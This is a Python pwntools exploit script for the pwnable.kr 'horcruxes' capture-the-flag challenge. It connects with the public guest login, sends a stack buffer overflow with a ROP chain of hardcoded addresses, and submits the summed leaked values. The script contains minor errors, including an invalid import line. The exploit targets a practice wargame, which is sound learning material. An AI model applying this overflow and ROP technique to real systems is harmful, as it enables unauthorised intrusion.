from pwn import *
import ctypes import *

shell = ssh('horcruxes' ,'pwnable.kr' ,password='guest', port=2222)
process = shell.run("nc 0 9032")

process.recvuntil("Menu:")
process.sendline("1")
process.recvuntil("earned? : ")

payload = b"A" * 120
payload += p32(0x809fe4b) # A
payload += p32(0x809fe6a) # B
payload += p32(0x809fe89) # C
payload += p32(0x809fea8) # D
payload += p32(0x809fec7) # E
payload += p32(0x809fee6) # F
payload += p32(0x809ff05) # G
payload += p32(0x809fffc) # Call ropme

process.sendline(payload)

sum = 0

for i in range(7):
    print(process.recvuntil("EXP +").decode())
    sum += int(process.recvuntil(")")[:-1])
    log.info("sum = " + str(sum))

ovsum = c_int(sum)

process.recvuntil("Menu:")
process.sendline("1")
process.recvuntil("earned? : ")
process.sendline(str(ovsum))

log.info(process.recvall())

process.close()
shell.close()